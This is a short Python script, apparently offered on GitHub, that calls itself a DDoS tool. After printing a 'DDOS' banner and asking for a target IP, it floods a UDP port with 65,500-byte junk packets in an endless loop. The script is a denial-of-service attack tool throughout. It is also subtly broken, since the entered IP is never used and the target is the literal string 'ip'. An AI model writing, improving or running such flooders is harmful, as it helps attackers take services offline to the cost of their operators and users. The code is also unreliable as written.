"""
========================================
Name:DDos   Author: Lalevin Martin
 Mailbox: zzlyxht@outlook.com                                                
 Github: http://github.com/nacglalevin 
Written in 2023-5-3
==================NACG==================
"""
import socket
import os
os.system("clear")
text="""
_____  _____   ____   _____
|  __ \|  __ \ / __ \ / ____|
| |  | | |  | | |  | | (___
| |  | | |  | | |  | |\___ \
| |__| | |__| | |__| |____) |
|_____/|_____/ \____/|_____/
"""
print(text)

target_addr = ('ip', 80)
ip = input("请输入 IP     : ")


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

data = 'A'*65500

while True:
    try:
        sock.sendto(data.encode(), target_addr)
    except:
        print('An error occurred')